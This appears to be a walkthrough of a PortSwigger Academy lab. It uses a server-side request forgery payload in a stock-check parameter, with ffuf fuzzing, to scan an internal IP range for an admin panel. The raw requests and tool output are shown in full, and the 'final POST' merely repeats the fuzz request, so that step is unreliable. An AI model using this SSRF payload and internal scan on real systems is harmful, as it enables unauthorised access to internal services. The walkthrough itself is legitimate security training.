---
title: "PortSwigger Academy — Basic SSRF against another back-end system (Web) Walkthrough"
---
# Basic SSRF against another back-end system

```
❓

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.
```

This lab is similar to  although for this one we need to iterate of an IP octet to find the correct IP where the admin page is hosted on the back end server. Following a similar process to the previous lab, this time using ffuf to iterate through the IP octet. Below is the command I used to do so.

```bash
ffuf -request req.txt -w <(seq 1 254):FUZZ -mc 200 -v
```

Below is my req.txt

```bash
POST /product/stock HTTP/2
Host: 0afe0044042cf6b9835732a100430091.web-security-academy.net
Cookie: session=VFARAKQPVoA5IxjsFCYBCg9WVOBXV52n
Content-Length: 33
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://0afe0044042cf6b9835732a100430091.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afe0044042cf6b9835732a100430091.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2F192.168.0.FUZZ:8080/admin
```

Below are the results 

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0afe0044042cf6b9835732a100430091.web-security-academy.net/product/stock
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Origin: https://0afe0044042cf6b9835732a100430091.web-security-academy.net
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Host: 0afe0044042cf6b9835732a100430091.web-security-academy.net
 :: Header           : Cookie: session=VFARAKQPVoA5IxjsFCYBCg9WVOBXV52n
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Sec-Fetch-Dest: empty
 :: Header           : Priority: u=1, i
 :: Header           : Sec-Ch-Ua-Platform: "Linux"
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
 :: Header           : Accept: */*
 :: Header           : Sec-Fetch-Mode: cors
 :: Header           : Referer: https://0afe0044042cf6b9835732a100430091.web-security-academy.net/product?productId=1
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
 :: Header           : Sec-Ch-Ua-Mobile: ?0
 :: Data             : stockApi=http%3A%2F%2F192.168.0.FUZZ:8080/admin
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 3141, Words: 1368, Lines: 67, Duration: 131ms]
| URL | https://0afe0044042cf6b9835732a100430091.web-security-academy.net/product/stock
    * FUZZ: 166

```

We can see that we received a 200 status code for the IP octet `166`, so here is the final POST to complete the lab.

```bash
POST /product/stock HTTP/2
Host: 0afe0044042cf6b9835732a100430091.web-security-academy.net
Cookie: session=VFARAKQPVoA5IxjsFCYBCg9WVOBXV52n
Content-Length: 33
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://0afe0044042cf6b9835732a100430091.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afe0044042cf6b9835732a100430091.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2F192.168.0.FUZZ:8080/admin
```

Check out [`Turbo Intruder`](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) as an alternative solution!
